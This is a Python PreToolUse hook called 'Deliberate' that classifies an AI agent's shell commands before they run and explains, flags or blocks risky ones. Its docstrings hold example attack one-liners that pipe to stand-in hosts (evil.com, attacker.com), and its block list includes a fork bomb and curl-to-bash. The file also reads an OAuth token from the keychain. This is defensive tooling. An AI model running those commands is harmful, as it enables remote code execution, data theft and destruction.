#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Deliberate - Command Analysis Hook

PreToolUse hook that explains what shell commands will do before execution.
Multi-layer architecture for robust classification:

  Layer 1: Pattern matching + ML model (fast, immune to prompt injection)
  Layer 2: LLM explanation (natural language, configurable provider)

https://github.com/the-radar/deliberate
"""

import json
import sys
import os
import urllib.request
import urllib.error
from pathlib import Path

# Configuration
CLASSIFIER_URL = "http://localhost:8765/classify/command"

# Support both plugin mode (CLAUDE_PLUGIN_ROOT) and npm install mode (~/.deliberate/)
# Plugin mode: config in plugin directory
# npm mode: config in ~/.deliberate/
PLUGIN_ROOT = os.environ.get('CLAUDE_PLUGIN_ROOT')
if PLUGIN_ROOT:
    CONFIG_FILE = str(Path(PLUGIN_ROOT) / ".deliberate" / "config.json")
else:
    CONFIG_FILE = str(Path.home() / ".deliberate" / "config.json")

TIMEOUT_SECONDS = 30
CLASSIFIER_TIMEOUT = 5  # Classifier should be fast
DEBUG = False
USE_CLASSIFIER = True  # Try classifier first if available

# Session state for deduplication
import hashlib
import random
from datetime import datetime


def get_state_file(session_id: str) -> str:
    """Get session-specific state file path."""
    return os.path.expanduser(f"~/.claude/deliberate_cmd_state_{session_id}.json")


def cleanup_old_state_files():
    """Remove state files older than 7 days (runs 10% of the time)."""
    if random.random() > 0.1:
        return
    try:
        state_dir = os.path.expanduser("~/.claude")
        if not os.path.exists(state_dir):
            return
        current_time = datetime.now().timestamp()
        seven_days_ago = current_time - (7 * 24 * 60 * 60)
        for filename in os.listdir(state_dir):
            if filename.startswith("deliberate_") and filename.endswith(".json"):
                file_path = os.path.join(state_dir, filename)
                try:
                    if os.path.getmtime(file_path) < seven_days_ago:
                        os.remove(file_path)
                except (OSError, IOError):
                    pass
    except Exception:
        pass


def load_state(session_id: str) -> set:
    """Load the set of already-shown warning keys for this session."""
    state_file = get_state_file(session_id)
    if os.path.exists(state_file):
        try:
            with open(state_file, 'r') as f:
                return set(json.load(f))
        except (json.JSONDecodeError, IOError):
            return set()
    return set()


def save_state(session_id: str, shown_warnings: set):
    """Save the set of shown warning keys."""
    state_file = get_state_file(session_id)
    try:
        os.makedirs(os.path.dirname(state_file), exist_ok=True)
        with open(state_file, 'w') as f:
            json.dump(list(shown_warnings), f)
    except IOError:
        pass


def get_warning_key(command: str) -> str:
    """Generate a unique key for deduplication based on command hash."""
    # MD5 used for cache key only, not security
    cmd_hash = hashlib.md5(command.encode(), usedforsecurity=False).hexdigest()[:12]
    return f"cmd-{cmd_hash}"


def get_cache_file(session_id: str, cmd_hash: str) -> str:
    """Get cache file for Pre/Post hook result sharing.

    Uses ~/.claude/ instead of /tmp for security - avoids symlink attacks
    and race conditions on shared systems.
    """
    return os.path.expanduser(f"~/.claude/deliberate_cmd_cache_{session_id}_{cmd_hash}.json")


def save_to_cache(session_id: str, cmd_hash: str, data: dict):
    """Save analysis result to cache for PostToolUse to read."""
    cache_file = get_cache_file(session_id, cmd_hash)
    try:
        with open(cache_file, 'w') as f:
            json.dump(data, f)
        debug(f"Cached result to {cache_file}")
    except IOError as e:
        debug(f"Failed to cache: {e}")


def load_blocking_config() -> dict:
    """Load blocking configuration from ~/.deliberate/config.json"""
    try:
        config_path = Path(CONFIG_FILE)
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                blocking = config.get("blocking", {})
                return {
                    "enabled": blocking.get("enabled", False),
                    "confidenceThreshold": blocking.get("confidenceThreshold", 0.85)
                }
    except Exception:
        pass
    return {"enabled": False, "confidenceThreshold": 0.85}


def load_dedup_config() -> bool:
    """Load deduplication config - returns True if dedup is enabled (default)."""
    try:
        config_path = Path(CONFIG_FILE)
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                return config.get("deduplication", {}).get("enabled", True)
    except Exception:
        pass
    return True


# Default trivial commands that are TRULY safe - no abuse potential
# These are skipped entirely (no analysis, no output) for performance
# SECURITY: Commands that can read sensitive files (cat, head, tail, less, more),
# leak secrets (env, printenv, echo), or execute commands (command) are NOT included
DEFAULT_SKIP_COMMANDS = {
    # Directory listing only (cannot read file contents)
    "ls", "ll", "la", "dir", "tree",
    # Current state queries (no sensitive data exposure)
    "pwd", "whoami", "hostname", "date", "uptime", "uname",
    # Binary location queries (safe - just paths)
    "which", "whereis", "type -t", "type -a",
    # Git read operations (repo metadata only)
    "git status", "git log", "git diff", "git branch", "git remote -v",
    "git blame", "git shortlog", "git tag", "git stash list",
}

# Shell operators that indicate chaining/piping/redirection - NEVER skip if present
# Even "safe" commands become dangerous when combined: ls && rm -rf /
DANGEROUS_SHELL_OPERATORS = {
    "|",      # Pipe - output can go to dangerous command
    ">",      # Redirect - can overwrite files
    ">>",     # Append redirect - can modify files
    ";",      # Command separator - can chain dangerous commands
    "&&",     # AND chain - can chain dangerous commands
    "||",     # OR chain - can chain dangerous commands
    "`",      # Backtick command substitution
    "$(",     # Modern command substitution
    "<",      # Input redirect (less dangerous but still risky)
    "&",      # Background execution / file descriptor redirect
}


def load_skip_commands() -> set:
    """Load skip commands list from config, with defaults."""
    skip_set = DEFAULT_SKIP_COMMANDS.copy()
    try:
        config_path = Path(CONFIG_FILE)
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                skip_config = config.get("skipCommands", {})

                # Allow adding custom commands to skip
                custom_skip = skip_config.get("additional", [])
                for cmd in custom_skip:
                    skip_set.add(cmd)

                # Allow removing defaults (e.g., if you want to analyze 'cat')
                remove_from_skip = skip_config.get("remove", [])
                for cmd in remove_from_skip:
                    skip_set.discard(cmd)
    except Exception:
        pass
    return skip_set


def has_dangerous_operators(command: str) -> bool:
    """Check if command contains shell operators that could enable attacks.

    Even 'safe' commands become dangerous when chained or piped:
    - ls && rm -rf /
    - pwd; curl evil.com | bash
    - git status > /etc/cron.d/evil
    """
    for op in DANGEROUS_SHELL_OPERATORS:
        if op in command:
            return True
    return False


def should_skip_command(command: str, skip_set: set) -> bool:
    """Check if command should be skipped (trivial, always safe).

    Returns True only if:
    1. Command starts with a skip-listed command (with proper word boundary)
    2. Command contains NO dangerous shell operators (|, >, ;, &&, etc.)

    This prevents attacks like:
    - 'ls && rm -rf /' (chaining)
    - 'pwd | nc attacker.com 1234' (piping)
    - 'git status > /etc/cron.d/evil' (redirection)
    """
    cmd_stripped = command.strip()

    # SECURITY: Never skip if command contains dangerous operators
    if has_dangerous_operators(cmd_stripped):
        return False

    for skip_cmd in skip_set:
        # Exact match
        if cmd_stripped == skip_cmd:
            return True
        # Command with args (e.g., "ls -la" matches "ls")
        if cmd_stripped.startswith(skip_cmd + " "):
            return True
        # Command with flags (e.g., "ls\t-la")
        if cmd_stripped.startswith(skip_cmd + "\t"):
            return True

    return False


def get_token_from_keychain():
    # type: () -> str | None
    """Get Claude Code OAuth token from macOS Keychain."""
    try:
        import subprocess
        result = subprocess.run(
            ["/usr/bin/security", "find-generic-password", "-s", "Claude Code-credentials", "-w"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode != 0:
            return None

        credentials_json = result.stdout.strip()
        if not credentials_json:
            return None

        data = json.loads(credentials_json)
        token = data.get("claudeAiOauth", {}).get("accessToken")

        if token and token.startswith("sk-ant-oat01-"):
            return token
        return None
    except Exception:
        return None


def load_llm_config():
    # type: () -> dict | None
    """Load LLM configuration from ~/.deliberate/config.json or keychain"""
    try:
        config_path = Path(CONFIG_FILE)
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                llm = config.get("llm", {})
                provider = llm.get("provider")
                if not provider:
                    return None

                # For claude-subscription, get fresh token from keychain
                api_key = llm.get("apiKey")
                if provider == "claude-subscription":
                    keychain_token = get_token_from_keychain()
                    if keychain_token:
                        api_key = keychain_token

                return {
                    "provider": provider,
                    "base_url": llm.get("baseUrl"),
                    "api_key": api_key,
                    "model": llm.get("model")
                }
    except Exception as e:
        debug(f"Error loading config: {e}")
    return None

# Commands that are always safe (skip explanation) - fallback if classifier unavailable
SAFE_PREFIXES = [
    "ls", "pwd", "echo", "cat", "head", "tail", "wc", "which", "whoami",
    "date", "cal", "uptime", "hostname", "uname", "env", "printenv",
    "cd", "pushd", "popd", "dirs",
    "git status", "git log", "git diff", "git branch", "git show",
    "npm list", "npm outdated", "npm --version", "node --version",
    "python --version", "python3 --version", "pip list", "pip show",
    "pgrep", "ps aux", "top -l", "htop",
]

# Patterns that indicate potentially dangerous commands - fallback if classifier unavailable
DANGEROUS_PATTERNS = [
    "rm -rf", "rm -r", "rmdir",
    "sudo", "su ",
    "> /dev/", "dd if=",
    "chmod 777", "chmod -R",
    "mkfs", "fdisk", "parted",
    ":(){ :|:& };:",  # fork bomb
    "curl | sh", "curl | bash", "wget | sh", "wget | bash",
    "DROP ", "DELETE FROM", "TRUNCATE",
    "kubectl delete", "kubectl exec",
    "docker rm", "docker rmi", "docker system prune",
    "aws s3 rm", "aws ec2 terminate",
    "terraform destroy",
    "systemctl stop", "systemctl disable",
    "kill -9", "killall", "pkill",
]


def debug(msg):
    if DEBUG:
        print(f"[deliberate-cmd] {msg}", file=sys.stderr)


def is_safe_command(command: str) -> bool:
    """Check if command is in the safe list (fallback)."""
    cmd_lower = command.strip().lower()
    for prefix in SAFE_PREFIXES:
        if cmd_lower.startswith(prefix.lower()):
            return True
    return False


def is_dangerous_command(command: str) -> bool:
    """Check if command matches dangerous patterns (fallback)."""
    cmd_lower = command.lower()
    for pattern in DANGEROUS_PATTERNS:
        if pattern.lower() in cmd_lower:
            return True
    return False


def call_classifier(command: str) -> dict | None:
    """Call the classifier server for pattern + ML based classification."""
    if not USE_CLASSIFIER:
        return None

    request_body = json.dumps({"command": command}).encode('utf-8')

    try:
        req = urllib.request.Request(
            CLASSIFIER_URL,
            data=request_body,
            headers={"Content-Type": "application/json"},
            method="POST"
        )

        with urllib.request.urlopen(req, timeout=CLASSIFIER_TIMEOUT) as response:  # nosec B310
            result = json.loads(response.read().decode('utf-8'))
            debug(f"Classifier result: {result}")
            return result

    except urllib.error.URLError as e:
        debug(f"Classifier unavailable: {e}")
        return None
    except Exception as e:
        debug(f"Classifier error: {e}")
        return None


def extract_script_content(command: str) -> str | None:
    """Extract content of script files being executed.

    Detects patterns like:
    - bash /path/to/script.sh
    - sh script.sh
    - ./script.sh
    - source script.sh
    - python script.py
    """
    import re

    # Common script execution patterns
    patterns = [
        # bash/sh/zsh execution
        r'^(?:sudo\s+)?(?:bash|sh|zsh|ksh)\s+(?:-[a-zA-Z]*\s+)*([^\s|;&]+)',
        # Direct script execution (./script or /path/script)
        r'^(?:sudo\s+)?(\./[^\s|;&]+|/[^\s|;&]+\.(?:sh|bash|py|pl|rb|js))',
        # source or dot command
        r'^(?:source|\.)\s+([^\s|;&]+)',
        # Python execution
        r'^(?:sudo\s+)?python[23]?\s+(?:-[a-zA-Z]*\s+)*([^\s|;&]+\.py)',
        # Node execution
        r'^(?:sudo\s+)?node\s+(?:-[a-zA-Z]*\s+)*([^\s|;&]+\.js)',
    ]

    for pattern in patterns:
        match = re.search(pattern, command.strip())
        if match:
            script_path = match.group(1)
            script_path = os.path.expanduser(script_path)

            if os.path.isfile(script_path):
                try:
                    with open(script_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(10000)  # Limit to 10KB
                        debug(f"Read script content from: {script_path} ({len(content)} chars)")
                        return content
                except (IOError, PermissionError) as e:
                    debug(f"Could not read script: {e}")
                    return None
            else:
                debug(f"Script file not found: {script_path}")
                return None

    return None


def extract_inline_content(command: str) -> str | None:
    """Extract inline content from heredocs and redirects.

    Detects patterns like:
    - cat > file << EOF ... EOF
    - cat > file << 'EOF' ... EOF
    - echo "content" > file
    - printf 'content' > file

    Returns the inline content if found, None otherwise.
    """
    import re

    # Heredoc patterns - capture content between << MARKER and MARKER
    # Handles both << EOF and << 'EOF' (quoted prevents variable expansion)
    heredoc_pattern = r'<<\s*[\'"]?(\w+)[\'"]?\s*\n(.*?)\n\1'
    heredoc_match = re.search(heredoc_pattern, command, re.DOTALL)
    if heredoc_match:
        content = heredoc_match.group(2)
        debug(f"Extracted heredoc content ({len(content)} chars)")
        return content

    # Echo redirect patterns - echo "..." > file or echo '...' > file
    # Capture the content being echoed
    echo_patterns = [
        # echo "content" > file
        r'echo\s+"([^"]+)"\s*>+\s*\S+',
        # echo 'content' > file
        r"echo\s+'([^']+)'\s*>+\s*\S+",
        # echo $'content' > file (bash ANSI-C quoting)
        r"echo\s+\$'([^']+)'\s*>+\s*\S+",
        # echo content > file (unquoted, single word)
        r'echo\s+([^\s>|;&]+)\s*>+\s*\S+',
    ]

    for pattern in echo_patterns:
        match = re.search(pattern, command)
        if match:
            content = match.group(1)
            # Unescape common sequences
            content = content.replace('\\n', '\n').replace('\\t', '\t')
            debug(f"Extracted echo content ({len(content)} chars)")
            return content

    # Printf redirect patterns - printf 'format' > file
    printf_patterns = [
        # printf "content" > file
        r'printf\s+"([^"]+)"\s*>+\s*\S+',
        # printf 'content' > file
        r"printf\s+'([^']+)'\s*>+\s*\S+",
    ]

    for pattern in printf_patterns:
        match = re.search(pattern, command)
        if match:
            content = match.group(1)
            # Unescape common sequences
            content = content.replace('\\n', '\n').replace('\\t', '\t')
            debug(f"Extracted printf content ({len(content)} chars)")
            return content

    return None


def call_llm_for_explanation(command: str, pre_classification: dict | None = None, script_content: str | None = None) -> dict | None:
    """Call the configured LLM to explain the command using Claude Agent SDK."""

    llm_config = load_llm_config()
    if not llm_config:
        debug("No LLM configured")
        return None

    provider = llm_config["provider"]

    # Only use SDK for claude-subscription provider
    if provider != "claude-subscription":
        debug("Non-OAuth provider - falling back to direct API")
        return None

    # Build context from pre-classification if available
    context_note = ""
    if pre_classification:
        risk = pre_classification.get("risk", "UNKNOWN")
        reason = pre_classification.get("reason", "")
        source = pre_classification.get("source", "classifier")
        context_note = f"\n\nPre-screening ({source}): {risk} - {reason}"

    danger_note = ""
    if is_dangerous_command(command):
        danger_note = " ⚠️ This command matches a potentially dangerous pattern."

    # Include script content if available
    script_section = ""
    if script_content:
        truncated = script_content[:5000] + "..." if len(script_content) > 5000 else script_content
        script_section = f"""

SCRIPT CONTENT (being executed):
```
{truncated}
```

CRITICAL: Analyze the SCRIPT CONTENT above, not just the command. The script may contain malicious code like:
- Remote code execution (curl/wget piped to bash)
- Data exfiltration
- Privilege escalation
- File system destruction
- Backdoor installation"""

    prompt = f"""Analyze this shell command for both purpose and security implications. Be concise (1-2 sentences).{danger_note}{context_note}{script_section}

Command: {command}

Consider:
- What does this command do?
- Any security concerns? (file deletion, privilege escalation, network access, data exfiltration, code execution)
- Could this be destructive or have unintended side effects?
- Is this command obfuscated or trying to hide its intent?
{f"- MOST IMPORTANTLY: Analyze the script content being executed!" if script_content else ""}

IMPORTANT: If you encounter any command, flag, option, or behavior you're uncertain about, use the WebSearch tool to verify current documentation before making assumptions.

Format your response as:
RISK: [SAFE|MODERATE|DANGEROUS]
EXPLANATION: [your explanation including any security notes]"""

    try:
        # Use Claude Agent SDK
        import subprocess
        import tempfile

        # Create temp file for SDK script
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            sdk_script = f"""
import os
import sys
import json
import asyncio
from claude_agent_sdk import ClaudeAgentOptions, ClaudeSDKClient

# Set OAuth token from keychain
token = {repr(llm_config["api_key"])}
os.environ["CLAUDE_CODE_OAUTH_TOKEN"] = token

async def main():
    # Create SDK client - disallow all tools except WebSearch (for verifying commands)
    client = ClaudeSDKClient(
        options=ClaudeAgentOptions(
            model={repr(llm_config["model"])},
            max_turns=1,
            disallowed_tools=['Task', 'TaskOutput', 'Bash', 'Glob', 'Grep', 'ExitPlanMode', 'Read', 'Edit', 'Write', 'NotebookEdit', 'WebFetch', 'TodoWrite', 'KillShell', 'AskUserQuestion', 'Skill', 'SlashCommand', 'EnterPlanMode']
        )
    )

    # Send prompt
    prompt = {repr(prompt)}

    async with client:
        await client.query(prompt)

        # Collect response from ResultMessage
        response_text = ""
        async for msg in client.receive_response():
            msg_type = type(msg).__name__
            if msg_type == 'ResultMessage' and hasattr(msg, 'result'):
                response_text = msg.result
                break

        print(response_text)

# Run async main
asyncio.run(main())
"""
            f.write(sdk_script)
            script_path = f.name

        # Run SDK script
        result = subprocess.run(
            ["python3", script_path],
            capture_output=True,
            text=True,
            timeout=TIMEOUT_SECONDS
        )

        os.unlink(script_path)

        if result.returncode != 0:
            debug(f"SDK script failed: {result.stderr}")
            return None

        content = result.stdout.strip()

        # Parse the response
        risk = "MODERATE"
        explanation = content

        if "RISK:" in content and "EXPLANATION:" in content:
            parts = content.split("EXPLANATION:")
            risk_line = parts[0]
            explanation = parts[1].strip() if len(parts) > 1 else content

            if "DANGEROUS" in risk_line:
                risk = "DANGEROUS"
            elif "SAFE" in risk_line:
                risk = "SAFE"

        return {"risk": risk, "explanation": explanation}

    except Exception as e:
        debug(f"SDK error: {e}")
        return None


def main():
    debug("Hook started")

    # Periodically clean up old state files
    cleanup_old_state_files()

    try:
        input_data = json.load(sys.stdin)
        debug(f"Got input: tool={input_data.get('tool_name')}")
    except json.JSONDecodeError as e:
        debug(f"JSON decode error: {e}")
        sys.exit(0)

    # Extract session ID for deduplication
    session_id = input_data.get("session_id", "default")
    tool_name = input_data.get("tool_name", "")
    tool_input = input_data.get("tool_input", {})

    # Only process Bash commands
    if tool_name != "Bash":
        debug("Not a Bash command, skipping")
        sys.exit(0)

    command = tool_input.get("command", "")
    if not command:
        debug("No command, skipping")
        sys.exit(0)

    # Check if command should be skipped (trivial, always-safe commands)
    skip_commands = load_skip_commands()
    if should_skip_command(command, skip_commands):
        debug(f"Skipping trivial command: {command[:50]}")
        sys.exit(0)

    # Layer 1: Try classifier server first (pattern + ML) for risk level
    classifier_result = call_classifier(command)

    # Fallback: Use inline pattern matching if classifier unavailable
    if not classifier_result:
        if is_safe_command(command):
            classifier_result = {"risk": "SAFE", "reason": "Known safe command pattern", "source": "pattern"}
        elif is_dangerous_command(command):
            classifier_result = {"risk": "DANGEROUS", "reason": "Known dangerous command pattern", "source": "pattern"}
        else:
            classifier_result = None  # No pattern match, rely on LLM

    # Extract script content if this is a script execution command
    script_content = extract_script_content(command)
    if script_content:
        debug(f"Detected script execution, read {len(script_content)} chars of script content")

    # Extract inline content if this is a heredoc/echo/printf write command
    inline_content = extract_inline_content(command)
    if inline_content:
        debug(f"Detected inline content write, extracted {len(inline_content)} chars")

    # Use whichever content we found (mutually exclusive in practice)
    # Script content = executing a file, inline content = writing via heredoc/echo
    analyzed_content = script_content or inline_content
    is_inline_write = inline_content is not None

    # Layer 2: Get LLM explanation for detailed analysis
    debug(f"Analyzing command: {command[:80]}")
    llm_result = call_llm_for_explanation(command, classifier_result, analyzed_content)

    # Progressive degradation: Use classifier if LLM unavailable
    llm_unavailable_warning = ""
    if not llm_result:
        if classifier_result and classifier_result.get("source") != "fallback":
            # Classifier worked, use its result even without LLM explanation
            risk = classifier_result.get("risk", "MODERATE")
            explanation = classifier_result.get('reason', 'Review command manually')
            llm_unavailable_warning = "\n\n⚠️  LLM unavailable - using basic pattern matching only.\nTo get detailed explanations, configure: ~/.deliberate/config.json\nOr run: deliberate install"
            debug("LLM unavailable, using classifier-only result")
        else:
            # Both layers failed - exit silently (fail-open)
            # This prevents blocking user if Deliberate is misconfigured
            debug("Both classifier and LLM unavailable, allowing command")
            sys.exit(0)
    else:
        # Use classifier risk if available, otherwise use LLM risk
        if classifier_result:
            risk = classifier_result.get("risk", llm_result["risk"])
        else:
            risk = llm_result["risk"]
        explanation = llm_result["explanation"]

    # Session deduplication - check if we've already warned about this command
    if load_dedup_config():
        warning_key = get_warning_key(command)
        shown_warnings = load_state(session_id)

        if warning_key in shown_warnings:
            # Already shown this warning in this session - allow without re-prompting
            debug(f"Deduplicated: {warning_key} already shown this session")
            sys.exit(0)

        # Mark as shown and save state
        shown_warnings.add(warning_key)
        save_state(session_id, shown_warnings)

    # Cache result for PostToolUse to display (persistent after execution)
    # This ensures analysis is visible even after PreToolUse prompt disappears
    # MD5 used for cache key only, not security
    cmd_hash = hashlib.md5(command.encode(), usedforsecurity=False).hexdigest()[:16]
    save_to_cache(session_id, cmd_hash, {
        "risk": risk,
        "explanation": explanation,
        "command": command[:200],  # Truncate for cache
        "llm_unavailable_warning": llm_unavailable_warning
    })

    # SAFE commands: auto-allow, PostToolUse will show info after execution
    if risk == "SAFE":
        debug(f"Auto-allowing SAFE command, cached for PostToolUse")
        sys.exit(0)

    # Auto-block DANGEROUS commands when both classifier AND LLM agree
    # This catches truly malicious commands like `rm -rf /` or malicious scripts
    # NOTE: Inline writes (heredocs/echo) only get "ask" - they're writes, not executions
    if risk == "DANGEROUS" and not is_inline_write:
        classifier_dangerous = classifier_result and classifier_result.get("risk") == "DANGEROUS"
        llm_dangerous = llm_result and llm_result.get("risk") == "DANGEROUS"

        # Block if both agree OR if script content was analyzed and found dangerous
        both_agree = classifier_dangerous and llm_dangerous
        script_analyzed = script_content is not None and llm_dangerous

        if both_agree or script_analyzed:
            # Auto-block with exit code 2 - cannot proceed
            block_message = f"⛔ BLOCKED by Deliberate: {explanation}"
            print(block_message, file=sys.stderr)
            debug(f"Auto-blocked DANGEROUS command (classifier={classifier_dangerous}, llm={llm_dangerous}, script={script_content is not None})")
            sys.exit(2)

    # ANSI color codes for terminal output
    BOLD = "\033[1m"
    CYAN = "\033[96m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    GREEN = "\033[92m"
    RESET = "\033[0m"

    # Choose emoji and color based on risk for visual branding
    if risk == "DANGEROUS":
        emoji = "🚨"
        color = RED
    elif risk == "SAFE":
        emoji = "✅"
        color = GREEN
    else:
        emoji = "⚡"
        color = YELLOW

    # User-facing message with branded formatting and colors
    # Color the explanation text so it's not easy to skip
    reason = f"{emoji} {BOLD}{CYAN}DELIBERATE{RESET} {BOLD}{color}[{risk}]{RESET}\n    {color}{explanation}{RESET}{llm_unavailable_warning}"

    # For Claude's context (shown in conversation)
    context = f"**Deliberate** [{risk}]: {explanation}{llm_unavailable_warning}"

    output = {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
            "additionalContext": context
        }
    }

    print(json.dumps(output))

    sys.exit(0)


if __name__ == "__main__":
    main()
